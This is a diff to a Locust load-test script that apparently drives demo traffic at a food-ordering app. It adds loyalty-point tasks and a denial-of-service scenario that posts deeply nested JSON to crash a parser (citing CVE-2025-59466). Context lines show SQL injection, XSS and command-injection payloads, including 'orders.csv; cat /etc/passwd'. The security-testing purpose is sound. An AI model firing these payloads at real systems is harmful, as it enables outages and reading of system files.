@@ -36,7 +36,21 @@ SQLI_PAYLOAD = "' OR 1=1--"
 CMD_INJECTION_RECEIPT = "txt;id"
 CMD_INJECTION_EXPORT = "orders.csv; cat /etc/passwd"
 
+DOS_NESTED_DEPTH = 15000
+
 HEADERS = {"User-Agent": "dd-demo-traffic/1.0"}
+
+
+def _nested_json(depth=DOS_NESTED_DEPTH):
+    """Build a deeply nested JSON object for DoS testing (CVE-2025-59466)."""
+    obj = {"value": "leaf"}
+    for _ in range(depth):
+        obj = {"rules": obj}
+    return obj
+
+
+# Cache the payload so we don't rebuild it on every request
+_DOS_PAYLOAD = _nested_json()
 
 
 def _extra_latency():
@@ -123,6 +137,34 @@ class CorndogUser(HttpUser):
         )
         _extra_latency()
 
+    @task(3)
+    def check_loyalty_points(self):
+        """GET /api/loyalty/points — check a customer's loyalty points."""
+        name = random.choice(CUSTOMER_NAMES)
+        self.client.get(
+            f"/api/loyalty/points?customer={name}",
+            headers=HEADERS,
+            name="GET /api/loyalty/points [golden]",
+        )
+        _extra_latency()
+
+    @task(4)
+    def earn_loyalty_points(self):
+        """POST /api/loyalty/earn — earn loyalty points for an order."""
+        prices = {1: 4.99, 2: 5.99, 3: 6.49, 4: 5.49}
+        item_id = random.choice(MENU_ITEM_IDS)
+        qty = random.randint(1, 3)
+        self.client.post(
+            "/api/loyalty/earn",
+            json={
+                "customerName": random.choice(CUSTOMER_NAMES),
+                "orderTotal": round(prices[item_id] * qty, 2),
+            },
+            headers=HEADERS,
+            name="POST /api/loyalty/earn [golden]",
+        )
+        _extra_latency()
+
     # ── Security failure scenarios ─────────────────────────────
 
     @task(2)
@@ -161,6 +203,17 @@ class CorndogUser(HttpUser):
             json=_random_order_payload(special_instructions=XSS_PAYLOAD),
             headers=HEADERS,
             name="POST /api/orders [xss]",
+        )
+
+    @task(1)
+    def scenario_dos_nested_json(self):
+        """DoS via deeply nested JSON — triggers CVE-2025-59466 stack overflow."""
+        self.client.post(
+            "/api/loyalty/validate-config",
+            json=_DOS_PAYLOAD,
+            headers=HEADERS,
+            name="POST /api/loyalty/validate-config [dos-nested-json]",
+            catch_response=True,
         )
 
     @task(1)
